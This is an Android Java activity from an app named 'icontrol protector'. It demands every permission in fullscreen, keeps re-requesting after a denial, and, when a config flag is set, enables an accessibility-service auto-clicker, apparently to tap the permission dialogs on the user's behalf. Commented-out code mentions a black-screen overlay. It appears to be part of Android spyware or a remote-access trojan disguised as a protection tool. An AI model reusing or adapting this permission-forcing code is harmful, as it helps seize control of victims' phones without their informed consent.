package com.icontrol.protector;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.Window;
import android.view.WindowManager;

import androidx.core.app.ActivityCompat;

public class PermissionsActivity extends Activity {

    private static PermissionsActivity instance = null;

    public static boolean isOpen(){
        if (instance != null){
            return true;
        }
        return false;
    }

    @Override
    protected void onCreate( Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try
        {
           // Context ctx = getApplicationContext();
            instance = this;

            requestWindowFeature(Window.FEATURE_NO_TITLE);
            getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                    WindowManager.LayoutParams.FLAG_FULLSCREEN);
            //setFinishOnTouchOutside(false);
            int PERMISSION_ALL = 987;
            String[] PERMISSIONS = MyPermissions.ALL_PERMISSIONS(getApplicationContext());
            if((Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) && !MyPermissions.hasPermissions(getApplicationContext(), PERMISSIONS)){



                requestPermissions( PERMISSIONS, PERMISSION_ALL);

//                if (Build.VERSION.SDK_INT >= 34 && WorkServices.My_Access_inst != null){
//                    final Handler handler = new Handler();
//                    handler.postDelayed(new Runnable() {
//                        @Override
//                        public void run() {
//                            if(My_Configs.Click_Prim.equals("1")){
//                                ToggleAccess(true);
//                            }
//                            AccessTools.Treger("fourceit",null);
//
//                        }
//                    }, 1000);
//                   // finish();
//                }else{
                    if(My_Configs.Click_Prim.equals("1")){
                        ToggleAccess(true);
                    }
               // }

            }else{
                finish();
            }


        }catch (Exception a){
            MyLoger.Error("ActPrims_onCreate",a.getMessage());
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
    }

    boolean once = false;
    @Override
    public void onRequestPermissionsResult(int requestCode,  String[] permissions,  int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case 987:{
                String[] PERMISSIONS = MyPermissions.ALL_PERMISSIONS(getApplicationContext());
                if (grantResults.length >0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
                {
                    ToggleAccess(false);
                    //AccessTools.BlackScreen(false);
                    if(MyPermissions.hasPermissions(getApplicationContext(), PERMISSIONS)){
                        finish();
                    }

                }else{

                    if(!MyPermissions.hasPermissions(getApplicationContext(), PERMISSIONS)){
                        requestPermissions( PERMISSIONS, 987);
                    }
                }
            }
        }

    }

    private void ToggleAccess(boolean state){
        //MySettings.WriteBool(getApplicationContext(), Consts.Auto_Clicker,state);
       // MySettings.WriteBool(getApplicationContext(), Consts.Auto_Prims,state);
        AccessServices.FOR_PRIMS = state;
        AccessServices.Auto_Click = state;

    }
//    @Override
//    public void finish() {
//        ToggleAccess(false);
//        AccessTools.BlackScreen(false);
//        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
//            super.finishAndRemoveTask();
//        }
//        else {
//            super.finish();
//        }
//    }
    @Override
    protected void onDestroy() {
        //ToggleAccess(false);
        //AccessTools.BlackScreen(false);
        instance = null;
        super.onDestroy();
    }



}
